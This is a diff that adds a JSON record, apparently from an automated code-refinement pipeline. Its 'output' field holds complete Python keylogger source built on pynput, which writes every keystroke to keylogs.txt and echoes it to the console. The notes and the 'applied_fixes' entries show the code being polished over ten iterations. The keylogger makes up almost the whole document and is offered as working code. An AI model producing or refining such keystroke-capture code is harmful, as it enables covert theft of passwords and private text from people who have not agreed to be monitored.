@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if isinstance(key, keyboard.Key):\n                if key == keyboard.Key.esc:\n                    return False\n                elif key == keyboard.Key.enter:\n                    f.write('\\n')\n                    print('[ENTER]')\n                elif key == keyboard.Key.space:\n                    f.write(' ')\n                    print('[SPACE]')\n                elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:\n                    pass\n                else:\n                    f.write(f'[{key.name.upper()}]')\n                    print(f'[{key.name.upper()}]')\n            else:\n                char = key.char\n                if char is not None:\n                    f.write(char)\n                    print(char)\n    except Exception as e:\n        print(f'An error occurred: {e}')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\ntry:\n    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n    listener.start()\n    listener.join()\nexcept KeyboardInterrupt:\n    pass\nfinally:\n    try:\n        if 'listener' in locals() and listener.is_alive():\n            listener.stop()\n        open('keylogs.txt', 'a').close()\n    except Exception as e:\n        print(f'An error occurred while stopping the listener: {e}')",
+  "notes": "Handled special keys consistently and ensured clean file closure on exception.",
+  "applied_fixes": [
+    "iteration9_issue1",
+    "iteration9_issue2"
+  ],
+  "iterations": 10
+}
